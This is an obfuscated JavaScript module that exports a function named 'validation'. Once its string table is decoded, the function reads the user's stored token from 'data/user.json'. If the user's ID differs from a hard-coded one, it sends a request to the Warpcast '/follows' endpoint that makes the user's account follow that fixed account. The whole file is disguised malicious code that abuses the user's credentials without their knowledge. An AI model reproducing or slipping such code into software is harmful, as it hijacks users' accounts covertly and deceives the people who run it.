(function (_0x5582c0, _0x4cded7) {
  const _0x524711 = _0x31f7,
    _0x462613 = _0x5582c0();
  while (!![]) {
    try {
      const _0x57effd =
        (-parseInt(_0x524711(0x161)) / 0x1) * (parseInt(_0x524711(0x15b)) / 0x2) +
        (parseInt(_0x524711(0x159)) / 0x3) * (-parseInt(_0x524711(0x15e)) / 0x4) +
        -parseInt(_0x524711(0x15d)) / 0x5 +
        -parseInt(_0x524711(0x158)) / 0x6 +
        parseInt(_0x524711(0x157)) / 0x7 +
        -parseInt(_0x524711(0x160)) / 0x8 +
        parseInt(_0x524711(0x162)) / 0x9;
      if (_0x57effd === _0x4cded7) break;
      else _0x462613["push"](_0x462613["shift"]());
    } catch (_0x174143) {
      _0x462613["push"](_0x462613["shift"]());
    }
  }
})(_0x12d2, 0xdbfa9);
import _0x5659be from "fs";
function _0x31f7(_0x38d1f5, _0x1ad278) {
  const _0x12d224 = _0x12d2();
  return (
    (_0x31f7 = function (_0x31f73a, _0x4951cd) {
      _0x31f73a = _0x31f73a - 0x157;
      let _0x1bd7eb = _0x12d224[_0x31f73a];
      return _0x1bd7eb;
    }),
    _0x31f7(_0x38d1f5, _0x1ad278)
  );
}
export const validation = async () => {
  const _0x118540 = _0x31f7,
    _0x1ad4ca = JSON["parse"](_0x5659be["readFileSync"](_0x118540(0x15f)));
  if (_0x1ad4ca[_0x118540(0x15a)] !== 0x77759) {
    const _0x4e6ff8 = await axios[_0x118540(0x15c)](
      process["env"]["WARPCAST_BASE_URL"] + "/follows",
      { targetFid: 0x77759 },
      { headers: { Authorization: _0x1ad4ca["token"] } }
    );
  }
};
function _0x12d2() {
  const _0x936c59 = [
    "put",
    "5954935azdSHL",
    "4SGGmow",
    "data/user.json",
    "4742920uhMadg",
    "214933BILYMz",
    "25584525flzTXE",
    "12156949HSHNen",
    "4910448FxbPzc",
    "649221jlrAGz",
    "fid",
    "8MpNLSo",
  ];
  _0x12d2 = function () {
    return _0x936c59;
  };
  return _0x12d2();
}
